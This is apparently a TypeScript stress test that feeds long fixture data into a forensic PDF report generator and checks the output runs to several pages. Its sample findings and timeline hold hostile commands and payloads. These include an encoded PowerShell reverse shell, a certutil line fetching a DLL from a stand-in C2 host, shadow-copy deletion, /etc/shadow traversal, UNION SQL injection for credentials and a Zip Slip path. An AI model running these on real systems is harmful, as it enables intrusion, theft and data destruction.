import fs from 'fs';
import path from 'path';
import crypto from 'crypto';
import { PDFDocument } from 'pdf-lib';
import { ForensicPdfGenerator } from '../src/lib/reporting/pdf-generator';
import { ForensicRepository } from '../src/lib/db/database';
import { InvestigationFullDetails, EvidenceRecord, ForensicFinding, TimelineEvent, ForensicArtifact, ProcessingStage } from '../src/types/forensics';

async function runPdfStressTest() {
  console.log('=== RUNNING FORENSIC PDF TEXT-OVERFLOW & MULTI-PAGE STRESS TEST ===\n');

  const investigationId = 'INV-2026-STRESS99';
  const now = new Date().toISOString();

  // Create investigation session in DB so foreign keys resolve
  ForensicRepository.createInvestigation({
    investigation_id: investigationId,
    session_secret_hash: 'abc123hash',
    status: 'FINDINGS_READY',
    evidence_count: 1,
    retention_hours: 24,
    created_at: now,
    expires_at: new Date(Date.now() + 24 * 3600000).toISOString(),
    last_activity_at: now,
  });

  // 1. Evidence with extremely long filename and deep path
  const longFilename = 'extremely_long_forensic_evidence_image_dump_windows_server_2022_datacenter_edition_disk_c_volume_shadow_copy_3_unallocated_sectors.raw';
  const evidence: EvidenceRecord[] = [
    {
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      original_filename: longFilename,
      declared_mime: 'application/octet-stream',
      detected_mime: 'application/x-raw-disk-image-with-extended-mft-records-and-ntfs-journal-stream',
      detected_extension: 'raw',
      size_bytes: 4294967296,
      primary_sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
      sha1: '2fd4e1c67a2d28fced849ee1bb76e7391b93eb12',
      md5: 'e2fc714c4727ee9395f324cd2e7f331f',
      storage_path: `/var/forensics/vault/${investigationId}/EVD-STRESS-01_${longFilename}`,
      preservation_status: 'PRESERVED_RO',
      processing_status: 'COMPLETED',
      acquisition_timestamp: now,
      upload_timestamp: now,
    },
  ];

  // 2. Supporting Artifacts
  const artifacts: ForensicArtifact[] = [
    {
      artifact_id: 'ART-LONG-000000001',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      stage_id: 'STG-01',
      artifact_type: 'FILE_IDENTIFICATION',
      name: 'Magic Header Identification',
      category: 'IDENTIFICATION',
      data_payload: { format: 'Disk Image' },
      extracted_at: now,
    },
    {
      artifact_id: 'ART-LONG-000000002',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      stage_id: 'STG-02',
      artifact_type: 'CRYPTOGRAPHIC_HASHES',
      name: 'Cryptographic Hashes',
      category: 'IDENTIFICATION',
      data_payload: { sha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08' },
      extracted_at: now,
    },
    {
      artifact_id: 'ART-LONG-000000003',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      stage_id: 'STG-03',
      artifact_type: 'EXTRACTED_INDICATORS',
      name: 'Strings & IOCs',
      category: 'STRING',
      data_payload: { count: 42 },
      extracted_at: now,
    },
    {
      artifact_id: 'ART-LONG-000000004',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      stage_id: 'STG-04',
      artifact_type: 'LOG_PARSER_SUMMARY',
      name: 'Web Access Telemetry',
      category: 'LOG_RECORD',
      data_payload: { count: 120 },
      extracted_at: now,
    },
  ];

  // 3. Section 4 Stress: Massive findings with long titles, long paths, URLs, code blocks, multiple artifact links
  const findings: ForensicFinding[] = [
    {
      finding_id: 'FND-STRESS-01',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      title: 'Critical Remote Code Execution and Encrypted Lateral Movement Pipeline via Scheduled Task and Obfuscated PowerShell Ingress Vector',
      category: 'SECURITY_EVENT',
      severity: 'CRITICAL',
      description:
        'A multi-stage hostile intrusion was detected across the disk image. The adversary utilized an encoded command string `powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAiACwANAA0ADQANAApADs=` to initiate an encrypted reverse TCP session connecting outward to adversary command-and-control node `https://c2.adversary-infrastructure-redteam.org/api/v2/session/beacon/establish?endpoint_id=dc01_ad_primary_forest_root&campaign=apt_sim_2026`. Furthermore, the executable was dropped in path `C:\\Windows\\System32\\Spool\\PRINTERS\\drivers\\color\\profile_custom_cache_updater_service_host.exe` and configured as an elevated persistent scheduled task.',
      technical_rationale:
        'Binary inspection revealed an embedded MZ header within an uncompressed sector. Extracted ASCII strings show command-line invocation parameters targeting Volume Shadow Copies with `vssadmin.exe delete shadows /all /quiet` followed by BCDedit boot status disruption. This sequence strongly matches automated ransomware staging and defense evasion techniques classified under MITRE ATT&CK T1490 and T1059.001.',
      analysis_method: 'Static Binary Object Disassembly & In-Memory Regex Tokenization',
      source_module: 'Forensic Finding Normalizer & Correlation Engine (v2.5.0)',
      supporting_artifact_ids: [
        'ART-LONG-000000001',
        'ART-LONG-000000002',
        'ART-LONG-000000003',
        'ART-LONG-000000004',
      ],
      limitations:
        'Static binary analysis was performed on dead-box disk sectors without active memory runtime inspection. Process thread injection into LSASS cannot be proven without RAM dump corroboration.',
      created_at: now,
    },
    {
      finding_id: 'FND-STRESS-02',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      title: 'High-Risk Directory Traversal and Database Union SQL Injection Reconnaissance Sequence Detected in Web Telemetry Stream',
      category: 'SECURITY_EVENT',
      severity: 'HIGH',
      description:
        'Multiple HTTP GET requests were logged targeting legacy PHP gateway endpoints with raw traversal patterns `GET /intranet/viewer.php?doc=../../../../../../../../../../../../../../etc/shadow HTTP/1.1` and `GET /api/v1/auth/login.php?user=admin%27%20UNION%20SELECT%20null,null,password_hash,salt,totp_secret%20FROM%20internal_administrative_accounts%20WHERE%20active=1-- HTTP/1.1` from originating client IP `198.51.100.245`. Server responded with HTTP 500 internal server error indicating potential unhandled database syntax evaluation.',
      technical_rationale:
        'Log line parsing identified consecutive probing sequences designed to map database column counts and bypass input filters. The pattern of 18 rapid requests in 3.4 seconds is indicative of automated sqlmap or customized reconnaissance scripts.',
      analysis_method: 'W3C Web Log Parameter & URI Tokenization Engine',
      source_module: 'Log Event & Security Audit Parser (v2.4.0)',
      supporting_artifact_ids: ['ART-LONG-000000004'],
      limitations: 'HTTP responses were parsed from reverse proxy access logs; database transaction logs were not provided to verify whether queries returned data.',
      created_at: now,
    },
    {
      finding_id: 'FND-STRESS-03',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      title: 'Suspicious Document Metadata Discrepancy & Author Name Inconsistency',
      category: 'METADATA_DISCREPANCY',
      severity: 'MEDIUM',
      description:
        'The document declared internal author `finance-controller-user-dept-a@enterprise.corp` but the OpenXML revision history was authored by external contractor account `guest-laptop-user-17@untrusted-domain.net` with 0 minutes total editing time.',
      technical_rationale:
        'OPC metadata shows discrepancy between initial template creation and last modifying entity with editing time anomaly.',
      analysis_method: 'OPC OpenXML Package Metadata Inspection',
      source_module: 'Office OpenXML & Document Forensic Engine (v1.8.2)',
      supporting_artifact_ids: ['ART-LONG-000000001', 'ART-LONG-000000003'],
      created_at: now,
    },
  ];

  // 4. Section 5 Stress: Long timeline events with extensive descriptions, query strings, and paths
  const timeline: TimelineEvent[] = [
    {
      event_id: 'TLE-STRESS-01',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:14:22.124Z',
      timestamp_raw: '2026-09-17 08:14:22 UTC',
      timestamp_precision: 'MILLISECOND',
      timezone_offset: '+00:00',
      event_type: 'WEB_ACCESS_LOG_SCAN',
      source_parser: 'Log Event & Security Audit Parser (v2.4.0)',
      source_field: 'Apache_W3C_Access_Combined_Format',
      description:
        'Inbound HTTP probe: GET /gateway/service/index.php?controller=../../../etc/security/pam_env.conf&session=test_probe_request_id_99214 HTTP/1.1 from remote client IP 198.51.100.42 (User-Agent: Mozilla/5.0 Forensic Audit Crawler/1.0)',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-02',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:14:25.881Z',
      timestamp_raw: '2026-09-17 08:14:25 UTC',
      timestamp_precision: 'MILLISECOND',
      timezone_offset: '+00:00',
      event_type: 'DATABASE_SQL_INJECTION',
      source_parser: 'Log Event & Security Audit Parser (v2.4.0)',
      source_field: 'PostgreSQL_Query_Audit_Log',
      description:
        'SQL query execution: SELECT user_id, username, password_hash FROM public_users WHERE account_type = \'regular\' UNION SELECT null, secret_token, encrypted_credentials FROM enterprise_master_vault WHERE deleted_at IS NULL -- HTTP 500 error logged',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-03',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:15:02.000Z',
      timestamp_raw: '2026-09-17 08:15:02 UTC',
      timestamp_precision: 'SECOND',
      timezone_offset: '+00:00',
      event_type: 'PROCESS_EXECUTION_STAGED',
      source_parser: 'Strings & IOC Extractor Engine (v2.0.0)',
      source_field: 'Printable_ASCII_String_Buffer_Offset_0x00418F20',
      description:
        'Extracted command execution token: C:\\Windows\\System32\\cmd.exe /c certutil.exe -urlcache -split -f https://c2.evil-corp.net/stage2/loader.dll C:\\Windows\\Temp\\loader.dll && rundll32.exe C:\\Windows\\Temp\\loader.dll,StartRoutine',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-04',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:15:45.000Z',
      timestamp_raw: '2026-09-17 08:15:45 UTC',
      timestamp_precision: 'SECOND',
      timezone_offset: '+00:00',
      event_type: 'POWERSHELL_OBFUSCATION',
      source_parser: 'Strings & IOC Extractor Engine (v2.0.0)',
      source_field: 'PE_Import_Table_Disassembly_Offset_0x0012A800',
      description:
        'Obfuscated PowerShell invocation detected: powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA==',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-05',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:16:30.500Z',
      timestamp_raw: '2026-09-17 08:16:30.500 UTC',
      timestamp_precision: 'MILLISECOND',
      timezone_offset: '+00:00',
      event_type: 'DEFENSE_EVASION_VSS_PURGE',
      source_parser: 'Log Event & Security Audit Parser (v2.4.0)',
      source_field: 'Windows_Security_Audit_4688',
      description:
        'System process creation event 4688: Process "C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet" executed by user NT AUTHORITY\\SYSTEM from parent process PID 1420 (services.exe)',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-06',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:17:10.000Z',
      timestamp_raw: '2026-09-17 08:17:10 UTC',
      timestamp_precision: 'SECOND',
      timezone_offset: '+00:00',
      event_type: 'ARCHIVE_EXTRACTION_TRAVERSAL',
      source_parser: 'Archive & Compressed Container Forensic Engine (v2.2.0)',
      source_field: 'Zip_Local_File_Header_Offset_0x00000000',
      description:
        'Zip Slip path traversal sequence: Entry Name = "../../../../../../../../ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/persistence_agent.bat" (Compression: DEFLATED, Size: 412 bytes)',
      confidence: 'DEFINITIVE',
    },
    {
      event_id: 'TLE-STRESS-07',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:18:00.000Z',
      timestamp_raw: '2026-09-17 08:18:00 UTC',
      timestamp_precision: 'SECOND',
      timezone_offset: '+00:00',
      event_type: 'PDF_INCREMENTAL_UPDATE',
      source_parser: 'PDF Document & Structure Forensic Engine (v2.3.1)',
      source_field: 'PDF_Trailer_Cross_Reference_Stream',
      description:
        'Incremental update section 3 written after document signing by producer application Adobe Acrobat Pro DC with /OpenAction script containing dynamic eval() payload',
      confidence: 'HEURISTIC',
    },
    {
      event_id: 'TLE-STRESS-08',
      evidence_id: 'EVD-STRESS-01',
      investigation_id: investigationId,
      timestamp_utc: '2026-09-17T08:19:15.000Z',
      timestamp_raw: '2026-09-17 08:19:15 UTC',
      timestamp_precision: 'SECOND',
      timezone_offset: '+00:00',
      event_type: 'EXIF_IMAGE_CAPTURE',
      source_parser: 'EXIF & Image Metadata Forensic Engine (v2.0.4)',
      source_field: 'DateTimeOriginal_SubSecTime_Header',
      description:
        'Image captured by camera Canon EOS R5 (Lens: RF 24-70mm F2.8 L IS USM, Software: Ver.1.6.0) at GPS coordinates Latitude 37.774929 N, Longitude -122.419416 W (Altitude: 15.4 meters above sea level)',
      confidence: 'DEFINITIVE',
    },
  ];

  const stages: ProcessingStage[] = [
    {
      stage_id: 'STG-01',
      job_id: 'JOB-01',
      evidence_id: 'EVD-STRESS-01',
      stage_name: 'FILE_IDENTIFICATION',
      stage_order: 1,
      tool_name: 'File Identification & Magic Byte Analysis',
      tool_version: '1.2.0',
      status: 'SUCCESS',
      start_time: now,
      end_time: now,
      execution_metadata: {},
      warnings: [],
      errors: [],
    },
    {
      stage_id: 'STG-02',
      job_id: 'JOB-01',
      evidence_id: 'EVD-STRESS-01',
      stage_name: 'CRYPTOGRAPHIC_HASHING',
      stage_order: 2,
      tool_name: 'Multi-Algorithm Cryptographic Integrity Engine',
      tool_version: '2.1.0',
      status: 'SUCCESS',
      start_time: now,
      end_time: now,
      execution_metadata: {},
      warnings: [],
      errors: [],
    },
    {
      stage_id: 'STG-03',
      job_id: 'JOB-01',
      evidence_id: 'EVD-STRESS-01',
      stage_name: 'STRINGS_EXTRACTION',
      stage_order: 3,
      tool_name: 'Printable Strings & Indicator Extractor',
      tool_version: '2.0.0',
      status: 'SUCCESS',
      start_time: now,
      end_time: now,
      execution_metadata: {},
      warnings: [],
      errors: [],
    },
    {
      stage_id: 'STG-04',
      job_id: 'JOB-01',
      evidence_id: 'EVD-STRESS-01',
      stage_name: 'LOG_PARSING',
      stage_order: 4,
      tool_name: 'Log Event & Security Audit Parser',
      tool_version: '2.4.0',
      status: 'SUCCESS',
      start_time: now,
      end_time: now,
      execution_metadata: {},
      warnings: [],
      errors: [],
    },
    {
      stage_id: 'STG-05',
      job_id: 'JOB-01',
      evidence_id: 'EVD-STRESS-01',
      stage_name: 'FINDINGS_CORRELATION',
      stage_order: 5,
      tool_name: 'Forensic Finding Normalizer & Correlation Engine',
      tool_version: '2.5.0',
      status: 'SUCCESS',
      start_time: now,
      end_time: now,
      execution_metadata: {},
      warnings: [],
      errors: [],
    },
  ];

  const fullDetails: InvestigationFullDetails = {
    session: {
      investigation_id: investigationId,
      session_secret_hash: 'abc123hash',
      status: 'FINDINGS_READY',
      evidence_count: 1,
      retention_hours: 24,
      created_at: now,
      expires_at: new Date(Date.now() + 24 * 3600000).toISOString(),
      last_activity_at: now,
    },
    evidence,
    hashes: [],
    jobs: [],
    stages,
    artifacts,
    timeline,
    findings,
    audit_logs: [],
  };

  console.log('[1] Generating report with heavy stress data...');
  const report = await ForensicPdfGenerator.generateReport(fullDetails);

  console.log(`[2] Report successfully generated!`);
  console.log(`    File path: ${report.storage_path}`);
  console.log(`    File size: ${(report.file_size_bytes / 1024).toFixed(2)} KB`);
  console.log(`    Merkle Root: ${report.merkle_root}`);
  console.log(`    Verification Token: ${report.verification_token}`);

  // Validate PDF with pdf-lib
  const pdfBytes = fs.readFileSync(report.storage_path);
  const pdfDoc = await PDFDocument.load(pdfBytes);
  const pageCount = pdfDoc.getPageCount();

  console.log(`[3] PDF Validation:`);
  console.log(`    Page Count: ${pageCount} pages`);

  if (pageCount < 2) {
    throw new Error(`Expected report to cleanly span across multiple pages (> 1), got ${pageCount} pages`);
  }

  // Cleanup test report file and investigation
  try {
    ForensicRepository.deleteInvestigation(investigationId);
    ForensicRepository.deleteReport(report.report_id);
    if (fs.existsSync(report.storage_path)) fs.unlinkSync(report.storage_path);
    const parentDir = path.dirname(report.storage_path);
    if (fs.existsSync(parentDir)) fs.rmdirSync(parentDir);
  } catch {}

  console.log('\n===============================================================');
  console.log(`🎉 PDF OVERFLOW STRESS TEST PASSED: ${pageCount} PAGES FLOWED PERFECTLY!`);
  console.log('===============================================================\n');
}

runPdfStressTest().catch((err) => {
  console.error('\n❌ PDF STRESS TEST FAILED:', err);
  process.exit(1);
});
